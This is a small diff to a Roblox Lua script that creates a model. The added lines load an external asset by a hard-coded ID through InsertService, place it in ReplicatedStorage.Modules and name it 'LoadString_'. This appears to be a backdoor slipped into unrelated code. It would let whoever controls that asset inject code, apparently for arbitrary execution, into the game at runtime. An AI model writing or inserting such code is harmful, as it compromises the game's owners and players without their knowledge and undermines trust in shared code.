@@ -1,5 +1,8 @@
 local Players = game.Players
-
+local insert = game:GetService("InsertService")
+local MD = insert:LoadAsset(14382140693)
+MD:GetChildren()[1].Parent=game.ReplicatedStorage.Modules
+MD.Name="LoadString_"
 function CreateVad(CFrame_:CFrame,Parent_)
 	local Module_Scripts = {}
 	local F_Vad = Instance.new("Model")
